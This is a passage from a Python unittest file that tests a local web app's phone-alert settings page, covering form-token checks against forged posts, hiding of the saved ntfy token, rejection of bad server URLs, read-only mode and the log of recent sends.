            with OPENER.open(req, timeout=30) as r:
                return r.status, r.read().decode("utf-8", "replace"), r.headers
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace"), e.headers

    def page(self):
        code, html, hdrs = self.fetch("/notify")
        self.assertEqual(code, 200)
        sid = [v.split("=", 1)[1].split(";")[0] for v in (hdrs.get_all("Set-Cookie") or [])
               if v.startswith("aj=")]
        self.assertTrue(sid, "the page hands out the upgrade 8 session")
        self.sess = "; aj=" + sid[0]
        toks = re.findall(r'name="ajtok" value="([^"]+)"', html)
        self.assertTrue(toks, "Save must carry the form token")
        return html, toks[0]

    def post(self, form):
        return self.fetch("/notify", form, origin=f"http://127.0.0.1:{self.port}")

    def test_the_page_offers_every_event_the_spec_names(self):
        html, _tok = self.page()
        self.assertIn("Phone alerts", html)
        for key, label, _hint in notifycfg.EVENTS:
            self.assertIn(f'name="{key}"', html, key)
            self.assertIn(label, html, label)
        self.assertEqual({k for k, _l, _h in notifycfg.EVENTS}, set(notify.EVENTS))
        self.assertIn("Off - no ntfy server is set", html)

    def test_the_nav_links_to_the_phone_page(self):
        code, home, _h = self.fetch("/")
        self.assertEqual(code, 200)
        self.assertIn('<a href="/notify">Phone</a>', home)

    def test_a_post_without_the_session_token_saves_nothing(self):
        _html, _tok = self.page()
        code, _body, _h = self.post({"server": SERVER, "topic": TOPIC})
        self.assertEqual(code, 403)
        self.assertEqual(notifycfg.settings(jobboard.NOTIFY_FILE).server, "")

    def test_a_post_carrying_someone_elses_token_is_refused(self):
        _html, _tok = self.page()
        code, _b, _h = self.post({"server": SERVER, "topic": TOPIC,
                                  "ajtok": decisions.token_for(decisions.new_sid())})
        self.assertEqual(code, 403)
        self.assertEqual(notifycfg.settings(jobboard.NOTIFY_FILE).server, "")

    def test_the_page_saves_with_its_own_session_and_token(self):
        _html, tok = self.page()
        quiet = daylight()
        code, _b, _h = self.post({"server": SERVER, "topic": TOPIC, "token": TOKEN,
                                  "quiet_start": quiet["quiet_start"],
                                  "quiet_end": quiet["quiet_end"],
                                  "job_finished": "1", "safety_stop": "1", "ajtok": tok})
        self.assertEqual(code, 303)
        s = notifycfg.settings(jobboard.NOTIFY_FILE)
        self.assertEqual((s.server, s.topic, s.token), (SERVER, TOPIC, TOKEN))
        self.assertEqual(s.events, {"job_finished", "safety_stop"})
        self.assertEqual(stat.S_IMODE(jobboard.NOTIFY_FILE.stat().st_mode), 0o600)
        code2, again, _h2 = self.fetch("/notify?ok=1")
        self.assertEqual(code2, 200)
        self.assertIn(quiet["quiet_start"], again)
        self.assertIn("<b>On.</b>", again)
        self.assertIn("Saved.", again)                 # the redirect's note came back

    def test_a_bad_server_is_refused_on_the_page_and_keeps_the_old_settings(self):
        turned_on(jobboard.NOTIFY_FILE)
        _html, tok = self.page()
        code, page, _h = self.post({"server": "nope", "topic": TOPIC, "ajtok": tok})
        self.assertEqual(code, 400)
        self.assertIn("Not saved", page)
        self.assertIn("http:// or https://", page)
        self.assertIn('name="server" value="nope"', page)   # what you typed comes back
        self.assertEqual(notifycfg.settings(jobboard.NOTIFY_FILE).server, SERVER)

    def test_the_saved_token_is_never_shown_back(self):
        turned_on(jobboard.NOTIFY_FILE)
        html, _tok = self.page()
        self.assertNotIn(TOKEN, html)
        self.assertIn('type="password" name="token"', html)
        self.assertIn("leave empty to keep it", html)

    def test_a_read_only_copy_shows_no_save_button_and_refuses_the_post(self):
        jobboard.READONLY = True
        try:
            html, tok = self.page()
            self.assertNotIn('<button name="test"', html)
            self.assertIn("read-only", html)
            code, _b, _h = self.post({"server": SERVER, "topic": TOPIC, "ajtok": tok})
            self.assertEqual(code, 403)
            self.assertEqual(notifycfg.settings(jobboard.NOTIFY_FILE).server, "")
        finally:
            jobboard.READONLY = False

    def test_the_page_lists_the_last_sends(self):
        notifycfg.log_send(jobboard.NOTIFY_FILE, "safety_stop", False, "connection refused")
        html, _tok = self.page()
        self.assertIn("safety_stop", html)
        self.assertIn("connection refused", html)
        self.assertIn("failed", html)


if __name__ == "__main__":
    unittest.main()
